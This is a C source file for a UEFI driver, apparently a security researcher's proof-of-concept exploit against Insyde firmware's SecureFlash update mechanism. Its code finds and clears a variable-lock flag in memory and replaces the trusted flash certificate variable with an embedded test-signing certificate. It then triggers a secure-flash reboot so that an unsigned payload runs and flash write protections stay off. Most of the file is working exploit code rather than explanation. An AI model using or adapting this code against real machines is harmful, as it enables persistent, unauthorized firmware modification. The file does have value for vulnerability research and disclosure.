/*
Copyright 2025 Nikolaj Schlej

Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <Uefi.h>
#include <Library/UefiDriverEntryPoint.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Protocol/Bds.h>

#pragma pack(push, 1)
typedef struct {
    UINT32 ImageSize;
    UINT64 ImageAddress;
    BOOLEAN SecureFlashTrigger;
    BOOLEAN ProcessingRequired;
} SECURE_FLASH_INFO;

typedef struct {
  UINT8 Byte48;
  UINT8 Byte8B;
  UINT8 Byte05;
  UINT32 RipOffset;
  UINT8 ByteC6;
  UINT8 Byte80;
  UINT32 RaxOffset;
  UINT8 Value;
} VARIABLE_RUNTIME_BDS_ENTRY_HOOK;
#pragma pack(pop)

#define WIN_CERT_TYPE_EFI_GUID 0x0EF1

STATIC UINT8 VariableBuffer[] = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MonotonicCount
    0x00, 0x00, 0x00, 0x00, //AuthInfo.Hdr.dwLength
    0x00, 0x00, //AuthInfo.Hdr.wRevision
    0x00, 0x00, //AuthInfo.Hdr.wCertificateType
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // AuthInfo.CertType
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // AuthInfo.CertType
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // CertData
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // CertData
    // Certificate in EFI_CERTIFICATE_LIST format
    0xa1, 0x59, 0xc0, 0xa5, 0xe4, 0x94, 0xa7, 0x4a, 0x87, 0xb5, 0xab, 0x15,
    0x5c, 0x2b, 0xf0, 0x72, 0x59, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x3d, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x82, 0x03, 0x29,
    0x30, 0x82, 0x02, 0x11, 0xa0, 0x03, 0x02, 0x01, 0x02, 0x02, 0x14, 0x24,
    0xbb, 0xe2, 0x37, 0xc6, 0x26, 0x00, 0x4c, 0xa9, 0xd6, 0xfa, 0x84, 0x83,
    0x89, 0xd5, 0xb9, 0x90, 0x32, 0xd3, 0x62, 0x30, 0x0d, 0x06, 0x09, 0x2a,
    0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b, 0x05, 0x00, 0x30, 0x24,
    0x31, 0x22, 0x30, 0x20, 0x06, 0x03, 0x55, 0x04, 0x03, 0x0c, 0x19, 0x43,
    0x6f, 0x64, 0x65, 0x52, 0x75, 0x73, 0x68, 0x20, 0x54, 0x65, 0x73, 0x74,
    0x20, 0x53, 0x69, 0x67, 0x6e, 0x69, 0x6e, 0x67, 0x20, 0x4b, 0x65, 0x79,
    0x30, 0x1e, 0x17, 0x0d, 0x32, 0x35, 0x30, 0x33, 0x30, 0x31, 0x30, 0x33,
    0x31, 0x39, 0x33, 0x36, 0x5a, 0x17, 0x0d, 0x32, 0x36, 0x30, 0x33, 0x30,
    0x31, 0x30, 0x33, 0x31, 0x39, 0x33, 0x36, 0x5a, 0x30, 0x24, 0x31, 0x22,
    0x30, 0x20, 0x06, 0x03, 0x55, 0x04, 0x03, 0x0c, 0x19, 0x43, 0x6f, 0x64,
    0x65, 0x52, 0x75, 0x73, 0x68, 0x20, 0x54, 0x65, 0x73, 0x74, 0x20, 0x53,
    0x69, 0x67, 0x6e, 0x69, 0x6e, 0x67, 0x20, 0x4b, 0x65, 0x79, 0x30, 0x82,
    0x01, 0x22, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d,
    0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x82, 0x01, 0x0f, 0x00, 0x30, 0x82,
    0x01, 0x0a, 0x02, 0x82, 0x01, 0x01, 0x00, 0xc2, 0x7f, 0xb3, 0x01, 0xb5,
    0xd3, 0x85, 0x1b, 0x5b, 0x57, 0x43, 0xe1, 0x4a, 0xf9, 0xa4, 0x60, 0x72,
    0xb6, 0x97, 0x18, 0x2c, 0xe6, 0x06, 0xe6, 0x72, 0x65, 0x78, 0xc0, 0x55,
    0xa2, 0xb1, 0x68, 0xa7, 0xf7, 0xcb, 0x64, 0x98, 0x51, 0x78, 0x14, 0x64,
    0xf5, 0xf0, 0x37, 0x2e, 0x98, 0x39, 0xf7, 0xbf, 0x50, 0x35, 0x86, 0xce,
    0xb7, 0xc0, 0x0b, 0xee, 0xec, 0xbd, 0x0e, 0x84, 0x65, 0xc2, 0x1b, 0x99,
    0x89, 0x4c, 0x6d, 0xab, 0x20, 0xd4, 0x76, 0xd0, 0x97, 0x92, 0x56, 0x0f,
    0x11, 0x3a, 0xdd, 0x02, 0xdc, 0xc3, 0x39, 0x87, 0x3a, 0x93, 0x4a, 0xce,
    0xd6, 0x87, 0x94, 0x06, 0xf4, 0x6a, 0xf8, 0x4a, 0x0c, 0x58, 0xca, 0x73,
    0xea, 0x64, 0x8d, 0x17, 0x87, 0x27, 0x35, 0xc6, 0xc5, 0xe8, 0x47, 0x77,
    0xd8, 0xa2, 0x23, 0xa2, 0x8a, 0x69, 0x47, 0x70, 0x56, 0x7c, 0x87, 0xf9,
    0x7c, 0x78, 0x4d, 0x73, 0x27, 0xe5, 0x9c, 0x1e, 0xd1, 0x01, 0xcb, 0xa1,
    0x1a, 0xb5, 0x1d, 0x15, 0xdd, 0x86, 0x49, 0x83, 0xe9, 0x09, 0xa8, 0x05,
    0x70, 0x49, 0xb7, 0x54, 0x6e, 0xfe, 0xb0, 0xf2, 0xff, 0x8d, 0x2d, 0xb7,
    0xef, 0x15, 0x2d, 0x11, 0xc5, 0xae, 0x34, 0x4a, 0x3d, 0x03, 0xd4, 0x27,
    0xb3, 0x76, 0x13, 0x50, 0x59, 0x1e, 0x07, 0xf7, 0x72, 0xaa, 0xb9, 0xe7,
    0x7b, 0x02, 0x02, 0xcb, 0xe6, 0x80, 0x43, 0xcc, 0x0d, 0x52, 0x73, 0x1c,
    0x65, 0xc7, 0x76, 0x14, 0xb7, 0xaf, 0x51, 0x5d, 0xe0, 0x3a, 0x08, 0x1e,
    0x66, 0xfe, 0xc2, 0xeb, 0xd5, 0x85, 0x09, 0xc4, 0xfa, 0xe0, 0x11, 0x5a,
    0x11, 0xfb, 0x59, 0x1b, 0x98, 0xb6, 0x27, 0x04, 0xad, 0x6e, 0xd9, 0x26,
    0xf3, 0x6e, 0xc7, 0x5f, 0xa8, 0xfc, 0xe3, 0x6a, 0xd6, 0x13, 0x7e, 0x8d,
    0x9f, 0x36, 0x8b, 0x48, 0x9c, 0x8b, 0x9c, 0xea, 0x0d, 0xeb, 0xa3, 0x02,
    0x03, 0x01, 0x00, 0x01, 0xa3, 0x53, 0x30, 0x51, 0x30, 0x1d, 0x06, 0x03,
    0x55, 0x1d, 0x0e, 0x04, 0x16, 0x04, 0x14, 0x2e, 0x20, 0x86, 0x6e, 0x21,
    0x5e, 0x7a, 0x1c, 0x04, 0x5c, 0xb5, 0x8f, 0xf6, 0x2e, 0x9c, 0x24, 0x36,
    0xf0, 0x37, 0x30, 0x30, 0x1f, 0x06, 0x03, 0x55, 0x1d, 0x23, 0x04, 0x18,
    0x30, 0x16, 0x80, 0x14, 0x2e, 0x20, 0x86, 0x6e, 0x21, 0x5e, 0x7a, 0x1c,
    0x04, 0x5c, 0xb5, 0x8f, 0xf6, 0x2e, 0x9c, 0x24, 0x36, 0xf0, 0x37, 0x30,
    0x30, 0x0f, 0x06, 0x03, 0x55, 0x1d, 0x13, 0x01, 0x01, 0xff, 0x04, 0x05,
    0x30, 0x03, 0x01, 0x01, 0xff, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48,
    0x86, 0xf7, 0x0d, 0x01, 0x01, 0x0b, 0x05, 0x00, 0x03, 0x82, 0x01, 0x01,
    0x00, 0x07, 0x91, 0x63, 0x3d, 0xd0, 0x0d, 0x7b, 0x65, 0x63, 0xf8, 0x62,
    0xe8, 0xf8, 0xb5, 0x4d, 0x67, 0x97, 0x9c, 0x73, 0x48, 0x98, 0x33, 0xfa,
    0x1e, 0xe0, 0xed, 0xff, 0xa7, 0xc7, 0x78, 0x36, 0xd7, 0x12, 0xa7, 0xd1,
    0x8f, 0xc7, 0x5d, 0x3e, 0xce, 0x9e, 0x94, 0xbd, 0x6d, 0xfe, 0x93, 0xe3,
    0xed, 0x30, 0x59, 0x2e, 0x49, 0xa0, 0x2b, 0x3e, 0x56, 0x51, 0x0c, 0x16,
    0xf5, 0xc2, 0x80, 0x1f, 0x85, 0xc3, 0x0a, 0xd8, 0xc8, 0x27, 0x5c, 0xbc,
    0xbd, 0x6f, 0xa4, 0x1a, 0x37, 0x2b, 0x03, 0xb2, 0x4c, 0xee, 0xd1, 0xc9,
    0x7b, 0xc5, 0xe1, 0xfd, 0xa1, 0x14, 0x00, 0x75, 0x0d, 0x5c, 0x21, 0x4b,
    0x1e, 0xef, 0xf1, 0xb9, 0xb2, 0xab, 0xa8, 0xe2, 0xb8, 0xbf, 0x06, 0xd1,
    0xb8, 0xd9, 0xa2, 0x82, 0xac, 0xc5, 0x4d, 0x37, 0xf0, 0x0e, 0x49, 0x35,
    0xc8, 0x72, 0xc4, 0x17, 0xef, 0x45, 0xb2, 0xb3, 0x28, 0xa6, 0xd7, 0xcf,
    0xd7, 0xb2, 0xc9, 0x87, 0x86, 0x8e, 0x02, 0xb7, 0x18, 0x23, 0x9d, 0x65,
    0x26, 0xfe, 0x30, 0x23, 0x57, 0xc1, 0x0a, 0x7f, 0x00, 0x1b, 0x89, 0x2c,
    0xcc, 0xe8, 0xc7, 0xa8, 0x26, 0x67, 0xd4, 0x5b, 0xd5, 0x58, 0xfa, 0xf3,
    0xbc, 0xbc, 0xfd, 0xe1, 0x9d, 0x5c, 0xd2, 0x77, 0xb7, 0x56, 0x91, 0xab,
    0x4b, 0x22, 0x70, 0x33, 0x54, 0x1d, 0x3d, 0x74, 0xfd, 0x17, 0xbc, 0x18,
    0xdd, 0x35, 0xd6, 0x87, 0xed, 0xf7, 0x07, 0x0d, 0x18, 0xba, 0x3b, 0x48,
    0xc3, 0x03, 0xb2, 0x98, 0xcc, 0x9d, 0xcb, 0xe0, 0x01, 0xe8, 0xd6, 0x79,
    0xf4, 0x90, 0xbf, 0x5e, 0xfc, 0xa6, 0xbe, 0x9d, 0xb1, 0xec, 0xdc, 0x39,
    0x17, 0xa0, 0x1a, 0xe7, 0x97, 0xa9, 0x9c, 0x88, 0x9c, 0xba, 0x29, 0x6c,
    0x0c, 0x02, 0x5b, 0x67, 0xaf, 0xc6, 0x32, 0x97, 0xe8, 0x58, 0x7c, 0xf9,
    0xb4, 0xf5, 0x2d, 0x68, 0xe8
};
UINTN VariableSize = 48 + 857;

EFI_GUID gSecureFlashVariableGuid = { 0x382af2bb, 0xffff, 0xabcd, {0xaa, 0xee, 0xcc, 0xe0, 0x99, 0x33, 0x88, 0x77} };
EFI_GUID gInsydeSpecialVariableGuid = { 0xc107cfcf, 0xd0c6, 0x4590, {0x82, 0x27, 0xf9, 0xd7, 0xfb, 0x69, 0x44 ,0xb4} };

EFI_STATUS
EFIAPI
SetCertAsInsydeSpecialVariable (
  VOID
  )
{
  EFI_STATUS Status;
  UINT32 Attributes = EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS |
                 EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_AUTHENTICATED_WRITE_ACCESS;
  EFI_VARIABLE_AUTHENTICATION *CertData = (EFI_VARIABLE_AUTHENTICATION *)VariableBuffer;
  
  CertData->AuthInfo.Hdr.dwLength = VariableSize;
  CertData->AuthInfo.Hdr.wRevision = 0x0200;
  CertData->AuthInfo.Hdr.wCertificateType = WIN_CERT_TYPE_EFI_GUID;
  gBS->CopyMem(&CertData->AuthInfo.CertType, &gInsydeSpecialVariableGuid, sizeof(EFI_GUID));
  
  Status = gRT->SetVariable(
                  L"SecureFlashCertData",
                  &gSecureFlashVariableGuid,
                  Attributes,
                  VariableSize,
                  VariableBuffer
                  );
  return Status;
}

EFI_STATUS
EFIAPI
SecureFlashPoCEntry (
    IN EFI_HANDLE        ImageHandle,
    IN EFI_SYSTEM_TABLE *SystemTable
    )
{
    EFI_STATUS Status;
    SECURE_FLASH_INFO SecureFlashInfo;
    UINT32 Attributes;
    UINTN Size = 0;
        
    //
    // This driver needs to do the following:
    // 1. Add AW attribute to SecureFlashCertData variable that is already set as NV+BS+RT
    //    This will ensure that SecureFlashDxe driver will fail to remove it
    // 2. Set SecureFlashTrigger=1 in SecureFlashInfo variable, 
    //    that should have been write-protected by EfiVariableLockProtocol, but isn't,
    //    because we are running from Driver0000 before ReadyToBoot event is signaled.
    //    This will ensure that SecureFlashPei and other relevant drivers will not enable
    //    flash write protections, and SecureFlashDxe will register a handler
    //    that will ultimately LoadImage/StartImage our payload stored in EFI/Insyde/isflash.bin
    //
    // All further cleanup can be done after getting control from SecureFlashDxe.
    //
    // All variables used for exploitation will be cleaned 
    //    by the virtue of not having them in the modified BIOS region
    //
        
    // Locate BDS arch protocol
    EFI_BDS_ARCH_PROTOCOL *Bds = NULL;
    Status = gBS->LocateProtocol(&gEfiBdsArchProtocolGuid, NULL, (VOID**) &Bds);
    if (EFI_ERROR(Status)) {
      gRT->SetVariable(L"SecureFlashPoCError1", &gSecureFlashVariableGuid, 7, sizeof(Status), &Status);
      return Status;
    }
    
    // The function pointer we have at Bds->BdsEntry points to the very top of the hook chain, we need to search it
    // for the following:
    // 48 8B 05 XX XX XX XX ; mov rax, cs:GlobalVariableArea
    // C6 80 CD 00 00 00 01 ; mov byte ptr [rax + 0CDh], 1 ; Locked = TRUE;
    // 48 FF 25 YY YY YY YY ; jmp cs:OriginalBdsEntry
    
    // Read bytes from memory at Bds->Entry until we encounter 48 FF 25 pattern
    UINT8* Ptr = (UINT8*)Bds->Entry;
    while (Ptr[Size] != 0x48 || Ptr[Size+1] != 0xFF || Ptr[Size+2] != 0x25) {
      Size++;
      if (Size == 0x100) break; // Put a limit to memory read in case it all fails
    }
    
    if (Size == 0x100) {
      gRT->SetVariable(L"SecureFlashPoCError2", &gSecureFlashVariableGuid, 7, Size, Ptr);
      return EFI_NOT_FOUND;
    }
    
    // VariableRuntimeDxe is loaded from AprioriDxe before all the other drivers that could have hooked Bds->Entry, to our hook will be the very first
    if (Size != sizeof(VARIABLE_RUNTIME_BDS_ENTRY_HOOK)) {
      gRT->SetVariable(L"SecureFlashPoCError3", &gSecureFlashVariableGuid, 7, Size, Ptr);
      return EFI_NOT_FOUND;
    }
    
    // It is indeed the very first one, proceed
    VARIABLE_RUNTIME_BDS_ENTRY_HOOK *Hook = (VARIABLE_RUNTIME_BDS_ENTRY_HOOK*)Bds->Entry;
    
    // Make sure we have all expected bytes at expected offsets
    if (Hook->Byte48 != 0x48 || Hook->Byte8B != 0x8B || Hook->Byte05 != 0x05 || Hook->ByteC6 != 0xC6 || Hook->Byte80 != 0x80) {
      gRT->SetVariable(L"SecureFlashPoCError4", &gSecureFlashVariableGuid, 7, Size, Ptr);
      return EFI_NOT_FOUND;
    }
      
    // Check the current value of InsydeVariableLock
    EFI_PHYSICAL_ADDRESS VariableRuntimeDxeGlobals = *(EFI_PHYSICAL_ADDRESS*)(Ptr + 7 + Hook->RipOffset); // 7 bytes is for the 48 8B 05 XX XX XX XX bytes of first instruction
    UINT8* InsydeVariableLock = (UINT8*)(VariableRuntimeDxeGlobals + Hook->RaxOffset);
    
    // Flip it to 0 if it was 1
    if (*InsydeVariableLock == 1) {
      *InsydeVariableLock = 0;
    }
    // Bail if it's something else
    else {
      gRT->SetVariable(L"SecureFlashPoCError5", &gSecureFlashVariableGuid, 7, sizeof(UINT8), &InsydeVariableLock);
      return EFI_NOT_FOUND;
    }
    
    // Try removing the current NV+BS+RT certificate variable (it might already be set as AW, removal will fail in this case)
    Status = gRT->SetVariable(L"SecureFlashCertData", &gSecureFlashVariableGuid, 0, 0, NULL);
    if (!EFI_ERROR(Status)) { 
      // Try setting it as special NV+BS+RT+AW variable
      Status = SetCertAsInsydeSpecialVariable();
      if (EFI_ERROR(Status)) {
        gRT->SetVariable(L"SecureFlashPoCError6", &gSecureFlashVariableGuid, 7, sizeof(Status), &Status);
          
        // Set certificate variable back as NV+BS+RT, this will allow to try again next boot
        gRT->SetVariable(L"SecureFlashCertData", &gSecureFlashVariableGuid, 7, VariableSize - 48, VariableBuffer + 48);
        return Status;
      }
    }
    
    // Check if we need to trigger SecureFlash boot, or it was already triggered
    Size = sizeof(SecureFlashInfo);
    Status = gRT->GetVariable(L"SecureFlashInfo", &gSecureFlashVariableGuid, &Attributes, &Size, &SecureFlashInfo);
    if (!EFI_ERROR(Status)) {
      if (SecureFlashInfo.SecureFlashTrigger == 0) {
        // Fill new SecureFlashInfo
        gBS->SetMem(&SecureFlashInfo, sizeof(SecureFlashInfo), 0);
        SecureFlashInfo.SecureFlashTrigger = 1; // Trigger secure flash on next reboot
        SecureFlashInfo.ImageSize = 1112568; // Size of our isflash.bin payload
          
        // Set the variable to initiate secure flash
        gRT->SetVariable(L"SecureFlashInfo", &gSecureFlashVariableGuid, 7, sizeof(SecureFlashInfo), &SecureFlashInfo);
        
        // Reset the system to initiate update
        gRT->ResetSystem(EfiResetCold, EFI_SUCCESS, 0, NULL);
      }
    }

    return EFI_SUCCESS;
}
